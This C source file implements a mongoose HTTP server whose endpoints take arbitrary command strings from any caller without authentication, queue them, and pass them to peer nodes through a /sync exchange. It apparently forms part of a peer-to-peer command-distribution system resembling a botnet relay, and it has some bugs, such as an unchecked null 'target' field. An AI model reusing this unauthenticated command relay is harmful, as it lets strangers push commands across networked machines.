#include "mongoose.h"
#include "task_queue.h"
#include "result_queue.h"
#include "peer-list.h"
#include "peers.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cjson/cJSON.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


static TaskQueue *global_tq;
static TaskLog *global_tl;
static ResultQueue *global_rq;

extern PeerList global_pl;

// simple compare for URI
static int uri_is(const struct mg_str *uri, const char *s) {
    size_t n = strlen(s);
    return uri->len == n && memcmp(uri->buf, s, n) == 0;
}

// Handle POST /receive-command
static void handle_recv_cmd(struct mg_connection *c, void *ev_data) {
    struct mg_http_message *hm = ev_data;

    char *body = strndup(hm->body.buf, hm->body.len);
    cJSON *json = cJSON_Parse(body);
    free(body);

    if (!json) {
        mg_http_reply(c, 400, "Content-Type: text/plain\r\n", "Invalid JSON\n");
        return;
    }

    // get all the body items
    cJSON *id_item  = cJSON_GetObjectItemCaseSensitive(json, "id");
    cJSON *cmd_item = cJSON_GetObjectItemCaseSensitive(json, "cmd");
    cJSON *target_item = cJSON_GetObjectItemCaseSensitive(json, "target");


    if (!cJSON_IsNumber(id_item) || !cJSON_IsString(cmd_item)) {
        cJSON_Delete(json);
        mg_http_reply(c, 400, "Content-Type: text/plain\r\n", "Missing id or cmd\n");
        return;
    }



    int id = id_item->valueint;
    const char *cmd = cmd_item->valuestring;
    const char *target = target_item->valuestring;

    // already there in tasks
    if(tl_find(global_tl, id) >= 0) {
        mg_http_reply(c, 200, "Content-Type: text/plain\r\n", "OK\n");
        return;
    }

    mg_http_reply(c, 200, "Content-Type: text/plain\r\n", "OK\n");

    if(tl_find(global_tl, id) < 0) {
        tq_add(global_tq, global_tl, id, cmd, target);
        printf("📩 Queued command %d: %s\n", id, cmd);
        // flood_command(&global_pl, id, cmd);
    }

    cJSON_Delete(json);
    // hl_free(&hl);
}

// Handles POST on /sync 
static void handle_sync(struct mg_connection *c, void *ev_data) {
    struct mg_http_message *hm = ev_data;

    char *body = strndup(hm->body.buf, hm->body.len);
    cJSON *json = cJSON_Parse(body);
    free(body);


    if (!json) {
        mg_http_reply(c, 400, "Content-Type: text/plain\r\n", "Invalid JSON\n");
        return;
    }

    // the stuff we get from sync
    cJSON *port_item = cJSON_GetObjectItemCaseSensitive(json, "my_port");
    cJSON *peers_array = cJSON_GetObjectItemCaseSensitive(json, "peers_array");
    cJSON *tasks_array = cJSON_GetObjectItemCaseSensitive(json, "task_array");

    if (!cJSON_IsNumber(port_item) || !cJSON_IsArray(peers_array) || !cJSON_IsArray(tasks_array)) {
        cJSON_Delete(json);
        mg_http_reply(c, 400, "Content-Type: text/plain\r\n", "missing my_port or peers_array or tasks_array, or you messed up lol\n");
        return;
    }

    int port = port_item->valueint;



    // getting the request ip, i hate this
    char ip[INET6_ADDRSTRLEN] = {0};
    struct sockaddr_storage ss;
    socklen_t slen = sizeof(ss);
    int fd = (int)(intptr_t)c->fd;  // grab Mongoose socket fd

    if (getpeername(fd, (struct sockaddr *)&ss, &slen) == 0) {
        if (ss.ss_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)&ss;
            inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));
        } else if (ss.ss_family == AF_INET6) {
            struct sockaddr_in6 *sin6 = (struct sockaddr_in6 *)&ss;
            inet_ntop(AF_INET6, &sin6->sin6_addr, ip, sizeof(ip));
        }
    } else {
        strcpy(ip, "0.0.0.0");
    }
    

    // sender remove receiver's ip, and receiver will add sender's ip make sure that both party do not have their peer own ip
    cJSON *sender = cJSON_CreateObject();
    cJSON_AddStringToObject(sender, "ip", ip);
    cJSON_AddNumberToObject(sender, "port", port);

    cJSON_AddItemToArray(peers_array, sender);
    // cJSON_Delete(sender);


    // now we handle the peers we received
    cJSON *item;
    cJSON_ArrayForEach(item, peers_array) {
        cJSON *port = cJSON_GetObjectItemCaseSensitive(item, "port");
        cJSON *ip = cJSON_GetObjectItemCaseSensitive(item, "ip");

        if (!cJSON_IsString(ip) || !cJSON_IsNumber(port)) continue;
        if (pl_find(&global_pl, ip->valuestring, port->valueint) >= 0) continue;
        
        pl_add(&global_pl, ip->valuestring, port->valueint);
    }


    // and now the tasks
    cJSON *new_task;
    cJSON_ArrayForEach(new_task, tasks_array) {
        cJSON *id = cJSON_GetObjectItemCaseSensitive(new_task, "id");
        cJSON *cmd = cJSON_GetObjectItemCaseSensitive(new_task, "cmd");
        // cJSON *target_item = cJSON_GetObjectItemCaseSensitive(new_task, "target");

        if (!cJSON_IsNumber(id) || !cJSON_IsString(cmd)) continue;
        if(tl_find(global_tl, id->valueint) >= 0) continue;

        tq_add(global_tq, global_tl, id->valueint, cmd->valuestring, "*");
        printf("📩 Queued command %d: %s\n", id->valueint, cmd->valuestring);
    }

    cJSON_Delete(json);


    // now preparing the response body
    cJSON *resp_body = cJSON_CreateObject();
    cJSON_AddNumberToObject(resp_body, "my_port", WEBSERVER_PORT);


    // peer list to send
    cJSON *resp_peerlist = cJSON_CreateArray();
    for(size_t i = 0; i < global_pl.len; i++) {
        if ((strcmp(global_pl.peers[i].ip, ip) == 0) && global_pl.peers[i].port == port) continue;

        cJSON *peer_obj = cJSON_CreateObject();
        cJSON_AddStringToObject(peer_obj, "ip", global_pl.peers[i].ip);
        cJSON_AddNumberToObject(peer_obj, "port", global_pl.peers[i].port);

        cJSON_AddItemToArray(resp_peerlist, peer_obj);
        // cJSON_Delete(peer_obj);
    }


    // task list to send
    cJSON *resp_tasklist = cJSON_CreateArray();
    for(size_t i = 0; i < global_tl->len; i++) {
        cJSON *task_obj = cJSON_CreateObject();
        cJSON_AddNumberToObject(task_obj, "id", global_tl->tasks[i].id);
        cJSON_AddStringToObject(task_obj, "cmd", global_tl->tasks[i].cmd);

        cJSON_AddItemToArray(resp_tasklist, task_obj);
    }

    // getting our shit together
    cJSON_AddItemToObject(resp_body, "peers_array", resp_peerlist);
    cJSON_AddItemToObject(resp_body, "task_array", resp_tasklist);

    char *raw_resp = cJSON_PrintUnformatted(resp_body);

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s\n", raw_resp);
    free(raw_resp);
    cJSON_Delete(resp_body);
}


// mongoose event handler (3‑arg signature)
static void fn(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_HTTP_MSG) {
        struct mg_http_message *hm = ev_data;
        if (uri_is(&hm->uri, "/receive-command")) {
            handle_recv_cmd(c, ev_data);
        } else if (uri_is(&hm->uri, "/sync")) {
            handle_sync(c, ev_data);
        } else {
            mg_http_reply(c, 404, "Content-Type: text/plain\r\n", "Not found\n");
        }
    }
}

void start_http_server(TaskQueue *tq, TaskLog *tl, ResultQueue *rq) {
    global_tq = tq;
    global_rq = rq;
    global_tl = tl;
    struct mg_mgr mgr;
    mg_mgr_init(&mgr);

    char listen_url[256];
    snprintf(listen_url, sizeof listen_url, "0.0.0.0:%d", 8080);

    // Listen on port 8080
    if (mg_http_listen(&mgr, listen_url, fn, NULL) == NULL) {
        fprintf(stderr, "❌ Failed to start HTTP server\n");
        exit(1);
    }
    printf("🌐 HTTP server listening on %s\n", listen_url);

    // Poll loop
    while (1) {
        mg_mgr_poll(&mgr, 1000);
    }
}
